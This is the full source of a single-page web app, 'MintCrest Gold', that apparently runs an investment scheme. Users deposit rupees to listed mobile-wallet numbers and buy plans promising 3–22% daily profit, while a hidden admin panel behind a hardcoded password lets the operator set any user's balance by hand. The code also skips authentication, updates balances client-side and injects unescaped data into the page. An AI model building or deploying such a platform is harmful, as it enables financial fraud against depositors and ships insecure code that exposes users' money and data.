<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    <title>MintCrest Gold | Final Master</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000103; color: white; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(35px); border: 1px solid rgba(255,255,255,0.08); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
        .page { display: none; animation: fadeIn 0.4s ease; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .badge-pending { background: rgba(234, 179, 8, 0.1); color: #eab308; padding: 2px 6px; border-radius: 4px; font-size: 8px; font-weight: 800; }
        .badge-approved { background: rgba(34, 197, 94, 0.1); color: #22c55e; padding: 2px 6px; border-radius: 4px; font-size: 8px; font-weight: 800; }
        .badge-rejected { background: rgba(239, 68, 68, 0.1); color: #ef4444; padding: 2px 6px; border-radius: 4px; font-size: 8px; font-weight: 800; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#000103] flex items-center justify-center p-8 text-center">
        <div class="w-full max-w-sm">
            <h1 onclick="adminTap()" class="text-5xl font-black italic mb-2 cursor-pointer uppercase tracking-tighter">MINT<span class="text-blue-500">CREST</span></h1>
            <p class="text-gray-500 text-[8px] uppercase tracking-[0.4em] mb-12 font-bold italic font-black">Admin Panel: 5 Clicks on Name</p>
            <div class="glass p-10 rounded-[3.5rem] border-t-2 border-blue-600 shadow-2xl">
                <input type="text" id="user-name" placeholder="Full Name" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-5 text-white uppercase focus:border-blue-500">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest active:scale-95">Unlock Vault</button>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        <div id="p-home" class="page active-page p-6">
            <div class="flex justify-between items-center mb-6">
                <div>
                    <p class="text-[8px] text-gray-500 uppercase font-black tracking-widest">Verified Account</p>
                    <h3 class="text-sm font-black text-blue-400" id="dash-user">GUEST</h3>
                </div>
            </div>
            <div class="glass p-10 rounded-[3rem] mb-6 border-l-8 border-blue-600 shadow-xl relative overflow-hidden">
                <p class="text-[9px] text-blue-400 font-extrabold mb-1 uppercase tracking-widest">Total Capital</p>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                <div class="mt-6 flex gap-3">
                    <span class="text-[8px] bg-green-500/10 text-green-400 px-4 py-2 rounded-full font-bold uppercase">Profit: <span id="v-profit">₨ 0</span></span>
                    <span id="tier-tag" class="text-[8px] bg-white/5 text-gray-400 px-4 py-2 rounded-full font-bold uppercase italic">No Active Fleet</span>
                </div>
            </div>
            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95">📥 <span class="text-[9px] font-black block mt-2 uppercase">Deposit</span></button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95">📤 <span class="text-[9px] font-black block mt-2 uppercase">Withdraw</span></button>
            </div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-center font-black italic mb-6 uppercase text-blue-500 text-xl tracking-widest">Fleet Marketplace</h2>
            <div id="plans-list" class="grid grid-cols-1 gap-3 pb-10"></div>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-8 rounded-[3.5rem] border-t-8 border-blue-600 shadow-2xl">
                <h3 class="font-black text-blue-500 mb-6 uppercase text-center italic">Fund Account</h3>
                <div class="bg-white/5 p-4 rounded-xl mb-4 text-[10px] font-bold">
                    <p>Easypaisa: <span class="text-blue-400">03379827882</span></p>
                    <p>JazzCash: <span class="text-blue-400">03705519562</span></p>
                </div>
                <input type="number" id="dep-amount" placeholder="Amount (PKR)" class="w-full bg-white/5 p-4 rounded-xl mb-3 text-center font-bold text-white outline-none border border-white/5">
                <input type="text" id="dep-trx" placeholder="Transaction ID (TID)" class="w-full bg-white/5 p-4 rounded-xl mb-3 text-center font-bold text-white uppercase border border-white/5">
                <input type="text" id="dep-promo" placeholder="Promo Code (Optional)" class="w-full bg-blue-600/10 p-4 rounded-xl mb-4 text-center font-black text-[10px] text-blue-400 uppercase border border-blue-500/20">
                <p class="text-[8px] text-gray-500 mb-2 uppercase font-bold text-center">Upload Payment Proof</p>
                <input type="file" id="dep-proof" accept="image/*" class="w-full text-[9px] mb-8 text-gray-400">
                <button onclick="submitDeposit()" id="dep-btn" class="w-full bg-blue-600 py-5 rounded-xl font-black text-[10px] uppercase">Submit Deposit</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] border-t-8 border-red-600">
                <h3 class="font-black text-red-500 mb-8 uppercase text-center italic text-sm">Withdraw Capital</h3>
                <input type="number" id="wd-amt" placeholder="Amount" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center font-bold text-white outline-none">
                <input type="text" id="wd-acc" placeholder="Bank/Account Details" class="w-full bg-white/5 p-4 rounded-xl mb-8 text-center font-bold text-[10px] text-white outline-none">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-5 rounded-xl font-black text-[10px] uppercase">Confirm Withdraw</button>
            </div>
        </div>

        <div id="p-activity" class="page p-6">
            <h2 class="text-center font-black italic mb-8 uppercase text-blue-400">Vault History</h2>
            <div id="user-history" class="space-y-2 pb-10"></div>
        </div>

        <div id="p-more" class="page p-6 space-y-6 pb-20">
            <div class="glass p-10 rounded-[3rem] text-center border-t-4 border-yellow-500">
                <h3 class="text-yellow-500 font-black text-[12px] uppercase mb-4 italic">Lucky Spin</h3>
                <div id="wheel" class="text-5xl mb-6 transition-all duration-[4s]">🎡</div>
                <button id="spin-btn" onclick="spinNow()" class="bg-yellow-600 px-10 py-3 rounded-xl font-black text-[9px] uppercase">Spin & Win</button>
            </div>
            <button onclick="logout()" class="w-full glass p-5 rounded-[2rem] text-red-500 font-black text-[10px] uppercase">Logout Vault</button>
        </div>
    </main>

    <nav id="bottom-nav" class="hidden glass p-8 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[4rem] border-t border-white/5">
        <button onclick="changePage('home')" id="n-home" class="active-tab text-2xl">🏠</button>
        <button onclick="changePage('invest')" id="n-invest" class="text-2xl">📈</button>
        <button onclick="changePage('activity')" id="n-activity" class="text-2xl">📜</button>
        <button onclick="changePage('more')" id="n-more" class="text-2xl">⚙️</button>
    </nav>

    <div id="admin-panel" class="fixed inset-0 bg-[#000103] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8"><h2 class="text-xl font-black text-blue-500 uppercase">Master Admin</h2><button onclick="closeAdmin()" class="text-red-500 font-black">X</button></div>
        <div id="adm-requests" class="space-y-4 mb-10"></div>
        <div class="border-t border-white/10 pt-6">
            <h3 class="text-blue-400 font-black text-[10px] mb-4 uppercase italic">Manage All Users</h3>
            <div id="adm-users" class="space-y-2"></div>
        </div>
    </div>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore(); const storage = firebase.storage();
        let user = null; let tapCount = 0;

        const plans = [
            {n:"Basic-X 1", p:200, r:3}, {n:"Basic-X 2", p:500, r:3.2}, {n:"Basic-X 3", p:800, r:3.4},
            {n:"Bronze-X 1", p:1000, r:3.6}, {n:"Bronze-X 2", p:2000, r:3.8}, {n:"Bronze-X 3", p:3000, r:4},
            {n:"Silver-X 1", p:5000, r:4.2}, {n:"Silver-X 2", p:7000, r:4.5}, {n:"Silver-X 3", p:10000, r:5},
            {n:"Gold-X 1", p:15000, r:5.5}, {n:"Gold-X 2", p:20000, r:6}, {n:"Gold-X 3", p:25000, r:6.5},
            {n:"Elite-X 1", p:35000, r:7}, {n:"Elite-X 2", p:45000, r:7.5}, {n:"Elite-X 3", p:60000, r:8},
            {n:"Master-X 1", p:75000, r:8.5}, {n:"Master-X 2", p:100000, r:9}, {n:"Pro-X 1", p:125000, r:9.5},
            {n:"Pro-X 2", p:150000, r:10}, {n:"Pro-X 3", p:200000, r:12},
            {n:"👑 CROWN KING", p:25000, r:22}, {n:"🔥 FLASH", p:5000, r:15}, {n:"💎 VIP", p:100000, r:18}, {n:"🚀 MARS", p:10000, r:12}, {n:"⚡ BOLT", p:2500, r:10}
        ];

        async function login() {
            const name = document.getElementById('user-name').value.trim().toUpperCase(); if(!name) return;
            localStorage.setItem('mc_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, lastSpin: 0, activeTier: 0, tierName: "Inactive" });
            db.collection("users").doc(name).onSnapshot(d => { user = d.data(); updateUI(); });
            db.collection("requests").where("user", "==", name).orderBy("time", "desc").onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = '';
                snap.forEach(d => { const r = d.data(); list.innerHTML += `<div class="glass p-4 rounded-xl flex justify-between items-center mb-2 text-[8px] font-black uppercase"><div>${r.type}<br><span class="opacity-30">${new Date(r.time).toLocaleString()}</span></div><div>₨ ${r.amount} <span class="badge-${r.status}">${r.status}</span></div></div>`; });
            });
            document.getElementById('dash-user').innerText = name;
            document.getElementById('auth-ui').classList.add('hidden'); document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans();
        }

        async function submitDeposit() {
            const a = document.getElementById('dep-amount').value, t = document.getElementById('dep-trx').value, pr = document.getElementById('dep-promo').value, file = document.getElementById('dep-proof').files[0];
            if(!a || !t || !file) return alert("Fill all info, sweetie!");
            document.getElementById('dep-btn').innerText = "Uploading...";
            const sRef = storage.ref(`proofs/${Date.now()}_${user.name}`);
            await sRef.put(file); const url = await sRef.getDownloadURL();
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, promo: pr||"None", proof: url, type: "Deposit", status: "pending", time: Date.now() });
            alert("Sent! Waiting for Admin Approval."); location.reload();
        }

        async function submitWithdraw() {
            const a = parseInt(document.getElementById('wd-amt').value), acc = document.getElementById('wd-acc').value;
            if(!a || !acc || a > user.balance) return alert("Insufficient Balance!");
            await db.collection("requests").add({ user: user.name, amount: a, acc: acc, type: "Withdraw", status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ balance: user.balance - a });
            alert("Withdrawal Requested!");
        }

        function spinNow() {
            if(Date.now() - (user.lastSpin || 0) < 86400000) return alert("Come back in 24h, sweetie!");
            const deg = Math.floor(2000 + Math.random() * 2000);
            document.getElementById('wheel').style.transform = `rotate(${deg}deg)`;
            setTimeout(async () => {
                const bonus = Math.floor(Math.random() * 200) + 50;
                alert(`You won ₨ ${bonus}! Admin will verify.`);
                await db.collection("requests").add({ user: user.name, amount: bonus, type: "Spin Reward", status: "pending", time: Date.now() });
                await db.collection("users").doc(user.name).update({ lastSpin: Date.now() });
            }, 4000);
        }

        function updateUI() { 
            document.getElementById('v-bal').innerText = "₨ " + (user.balance||0); 
            document.getElementById('v-profit').innerText = "₨ " + (user.profit||0); 
            document.getElementById('tier-tag').innerText = user.tierName;
        }

        function renderPlans() { const l = document.getElementById('plans-list'); l.innerHTML = ''; plans.forEach(p => { l.innerHTML += `<div onclick="buy(${p.p},${p.r},'${p.n}')" class="glass p-5 rounded-[2rem] flex justify-between items-center mb-2 border-l-4 border-blue-500/20 active:scale-95"><div><h4 class="font-black text-[10px] text-blue-400 uppercase">${p.n}</h4><p class="text-[7px] text-gray-500 uppercase">${p.r}% Daily Profit</p></div><p class="font-black text-[12px]">₨ ${p.p}</p></div>`; }); }
        async function buy(p,r,n) { if(user.balance < p) return alert("Recharge needed!"); await db.collection("users").doc(user.name).update({ balance: user.balance-p, activeTier: p, tierROI: r, tierName: n }); alert("Fleet Activated!"); }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page'); }
        function adminTap() { tapCount++; if(tapCount>=5) { if(prompt("Master Password:")==="mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }

        function syncAdmin() {
            db.collection("requests").where("status","==","pending").onSnapshot(snap => {
                const list = document.getElementById('adm-requests'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); list.innerHTML += `<div class="glass p-4 text-[8px] font-black uppercase mb-2 border-l-4 border-yellow-500">User: ${d.user}<br>Type: ${d.type}<br>Amt: ${d.amount}<br>TID: ${d.tid||'N/A'}<br>Acc: ${d.acc||'N/A'}<br>Promo: ${d.promo||'None'}<br>${d.proof?`<a href="${d.proof}" target="_blank" class="text-blue-400 underline italic">VIEW PHOTO</a>`:''}<div class="mt-2 flex gap-2"><button onclick="handle('${doc.id}','${d.user}',${d.amount},'approved')" class="bg-green-600 px-4 py-2 rounded">APPROVE</button><button onclick="handle('${doc.id}','${d.user}',0,'rejected')" class="bg-red-600 px-4 py-2 rounded">REJECT</button></div></div>`; });
            });
            db.collection("users").onSnapshot(snap => {
                const list = document.getElementById('adm-users'); list.innerHTML = '';
                snap.forEach(doc => { const u = doc.data(); list.innerHTML += `<div onclick="editUser('${u.name}')" class="glass p-4 flex justify-between items-center text-[8px] font-black uppercase"><span>${u.name}</span><span class="text-blue-400">Bal: ${u.balance} | Prof: ${u.profit}</span></div>`; });
            });
        }

        async function handle(id, u, amt, act) {
            let bonus = 0; if(act==='approved') bonus = parseInt(prompt("Enter Bonus (Extra PKR) for this user:", "0") || 0);
            const ref = db.collection("users").doc(u); const d = await ref.get();
            if(act==='approved') await ref.update({ balance: (d.data().balance||0) + amt + bonus });
            await db.collection("requests").doc(id).update({ status: act });
            alert("Action Processed!");
        }

        async function editUser(name) {
            const newBal = prompt(`Edit Balance for ${name}:`); if(newBal===null) return;
            const newProf = prompt(`Edit Profit for ${name}:`);
            await db.collection("users").doc(name).update({ balance: parseInt(newBal), profit: parseInt(newProf) }); alert("Vault Updated!");
        }
        function logout() { localStorage.clear(); location.reload(); }
    </script>
</body>
</html>
